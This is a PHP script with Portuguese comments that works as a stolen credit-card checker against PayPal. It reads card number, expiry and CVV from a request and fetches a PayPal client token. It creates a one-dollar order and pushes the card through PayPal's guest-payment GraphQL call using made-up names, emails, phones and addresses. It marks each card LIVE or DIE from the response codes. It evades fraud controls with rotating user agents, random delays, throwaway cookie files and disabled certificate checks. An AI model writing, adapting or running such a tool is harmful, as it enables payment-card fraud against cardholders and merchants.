<?php
error_reporting(0);
session_destroy();
header('Content-Type: text/plain');

$start_time = microtime(true);

function getRandomUserAgent() {
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    ];
    return $agents[array_rand($agents)];
}

function getStr($string, $start, $end) {
    if (!$string) return '';
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    return explode($end, $str[1])[0];
}

function executeCurl($url, $method, $headers, $postFields = null) {
    // Cada requisição tem seu próprio cookie file
    $cookieFile = sys_get_temp_dir() . '/paypal_' . uniqid() . '_' . rand(10000, 99999) . '.txt';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    
    if ($postFields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postFields));
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Limpar cookie file ao final
    @unlink($cookieFile);
    
    return $response ?? '';
}

$lista = $_POST['lista'] ?? $_GET['lista'] ?? '';
if (!$lista) exit;

[$cc, $mes, $ano, $cvv] = array_pad(explode('|', $lista), 4, '');

$ano = strlen($ano) === 2 ? '20' . $ano : $ano;
$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);

$cardTypes = ['4' => 'VISA', '5' => 'MASTER_CARD', '3' => 'AMEX', '6' => 'DISCOVER'];
$cardType = $cardTypes[substr($cc, 0, 1)] ?? 'VISA';

$nomes = ['John', 'Maria', 'Ana', 'Carlos', 'Sofia', 'Lucas', 'Julia', 'Diego', 'Patricia', 'Roberto', 'Amanda', 'Fernando'];
$sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Costa', 'Ferreira', 'Alves', 'Gomes', 'Martinez', 'Rodriguez'];
$firstName = $nomes[array_rand($nomes)];
$lastName = $sobrenomes[array_rand($sobrenomes)];
$email = strtolower($firstName . '.' . $lastName . rand(100, 999) . '@gmail.com');
$phone = '55' . rand(11, 99) . rand(900000000, 999999999);
$postalCode = sprintf("%05d", rand(10000, 99999));

$userAgent = getRandomUserAgent();

// Delay aleatório ANTES de começar
usleep(rand(1000000, 3000000));

// Step 1: Get Token
$response = executeCurl(
    "https://www.paypal.com/smart/buttons?clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&currency=USD&rn=" . rand(100000, 999999),
    "GET",
    [
        "User-Agent: $userAgent",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,es;q=0.6",
        "Cache-Control: no-cache",
        "Pragma: no-cache"
    ]
);

$token = getStr($response, 'facilitatorAccessToken":"', '"');
if (!$token) {
    $tempo = round(microtime(true) - $start_time, 2);
    echo "DIE | $cc|$mes|$ano|$cvv | TOKEN_FAIL | {$tempo}s";
    exit;
}

usleep(rand(1000000, 2500000));

// Step 2: Create Order
$orderPayload = [
    "purchase_units" => [[
        "amount" => ["value" => "1.00", "currency_code" => "USD"],
        "description" => "Payment"
    ]],
    "intent" => "CAPTURE",
    "application_context" => ["shipping_preference" => "NO_SHIPPING"]
];

$response = executeCurl(
    "https://www.paypal.com/v2/checkout/orders",
    "POST",
    [
        "User-Agent: $userAgent",
        "Authorization: Bearer " . $token,
        "Content-Type: application/json",
        "Accept: application/json",
        "Accept-Language: pt-BR,pt;q=0.9"
    ],
    $orderPayload
);

$orderId = getStr($response, '"id":"', '"');
if (!$orderId) {
    $tempo = round(microtime(true) - $start_time, 2);
    echo "DIE | $cc|$mes|$ano|$cvv | ORDER_FAIL | {$tempo}s";
    exit;
}

usleep(rand(1000000, 2500000));

// Step 3: GraphQL Payment
$graphqlPayload = [
    "query" => "mutation payWithCard(\$token: String!, \$card: CardInput!, \$phoneNumber: String, \$firstName: String, \$lastName: String, \$email: String, \$billingAddress: AddressInput) { approveGuestPaymentWithCreditCard(token: \$token, card: \$card, phoneNumber: \$phoneNumber, firstName: \$firstName, lastName: \$lastName, email: \$email, billingAddress: \$billingAddress) { flags { is3DSecureRequired } } }",
    "variables" => [
        "token" => $orderId,
        "card" => [
            "cardNumber" => $cc,
            "type" => $cardType,
            "expirationDate" => "$mes/$ano",
            "postalCode" => $postalCode,
            "securityCode" => $cvv
        ],
        "phoneNumber" => $phone,
        "firstName" => $firstName,
        "lastName" => $lastName,
        "email" => $email,
        "billingAddress" => [
            "givenName" => $firstName,
            "familyName" => $lastName,
            "state" => "NY",
            "country" => "US",
            "postalCode" => $postalCode,
            "line1" => "123 Main St",
            "city" => "New York"
        ]
    ]
];

$response = executeCurl(
    "https://www.paypal.com/graphql?fetch_credit_form_submit",
    "POST",
    [
        "User-Agent: $userAgent",
        "Content-Type: application/json",
        "Paypal-Client-Context: $orderId",
        "Accept: application/json",
        "Accept-Language: pt-BR,pt;q=0.9"
    ],
    $graphqlPayload
);

$data = json_decode($response, true);
$codigo = 'UNKNOWN';

if (isset($data['errors']) && is_array($data['errors']) && !empty($data['errors'])) {
    $error = $data['errors'][0];
    if (isset($error['data'][0]['code'])) {
        $codigo = $error['data'][0]['code'];
    } elseif (isset($error['message'])) {
        $codigo = $error['message'];
    } else {
        $codigo = 'ERROR';
    }
} elseif (isset($data['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired'])) {
    $codigo = '3DS_REQUIRED';
} elseif (isset($data['data']['approveGuestPaymentWithCreditCard'])) {
    $codigo = 'APPROVED';
}

$allowedTerms = ["INVALID_SECURITY_CODE", "LOGIN_ERROR", "is3DSecureRequired", "EXISTING_ACCOUNT_RESTRICTED", "RISK_DISALLOWED", "3DS_REQUIRED"];
$isLive = in_array($codigo, $allowedTerms);

$tempo = round(microtime(true) - $start_time, 2);

if ($isLive) {
    echo "LIVE | $cc|$mes|$ano|$cvv | $codigo | {$tempo}s";
} else {
    echo "DIE | $cc|$mes|$ano|$cvv | $codigo | {$tempo}s";
}

// Destruir todas as sessões
session_destroy();
exit;
?>
